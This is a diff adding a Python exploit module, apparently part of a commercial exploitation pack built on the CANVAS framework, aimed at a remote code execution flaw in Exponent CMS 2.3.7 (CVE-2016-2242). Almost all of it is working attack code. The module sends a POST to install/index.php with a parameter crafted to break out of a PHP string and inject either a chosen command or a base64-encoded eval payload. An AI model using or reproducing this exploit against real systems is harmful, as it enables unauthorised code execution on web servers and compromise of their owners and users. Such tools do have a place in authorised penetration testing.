@@ -1,0 +1,96 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from ExploitTypes.phpexploit import *
+import canvasengine
+import urllib
+import libs.spkproxy as spkproxy
+
+# GUI info
+NAME = "Exponent CMS 2.3.7 Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in Exponent CMS 2.3.7"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Exponent CMS"
+DOCUMENTATION["Date public"] = "2016.02.03"
+DOCUMENTATION["VersionsAffected"] = "Exponent CMS <= 2.3.7"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "https://www.htbridge.com/advisory/HTB23290"
+DOCUMENTATION["CVE Name"] = "CVE-2016-2242"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2242"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
+PROPERTY['VERSION'] = [ "All" ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+
+class theexploit(phpexploit):
+    def __init__(self):
+        phpexploit.__init__(self)
+        self.port = 80
+        self.host = ""
+        self.setVersions()
+        self.version = 0
+        self.done = 0
+        self.ssl = ""
+        self.name = NAME
+        self.basepath = "/"
+        self.basepaths = ["/exponent220/","/"]
+        self.command = None
+        self.basicauth_user = ""
+        self.basicauth_password = ""
+        self.hostname = None
+        self.verb = "GET"
+        self.content_type = "application/x-www-form-urlencoded"
+        self.targetpath = "index.php"
+        self.foundstrings = ["exponent", "Exponent"]
+        self.testfile = "index.php"        
+        return
+    
+    def geturlarguments(self):        
+        if self.command:
+            self.log("Command: %s"%self.command)
+            command = self.command
+            command = self.encode_php(command)                                                                    
+        else:
+            command = self.get_php_to_mosdef()
+            command = b64encode(command).strip()            
+            command = 'eval(base64_decode('+self.encode_php(command)+'));'                        
+                   
+        params = urllib.urlencode({'sc[","");echo(]': '"); '+command+' //'})           
+        url = "install/index.php"            
+        self.ua.addHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8")
+        data = self.ua.POST(url, params)    
+                    
+        return "" 
+    
+    def parse_command_response(self, data):        
+        return data
+    
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
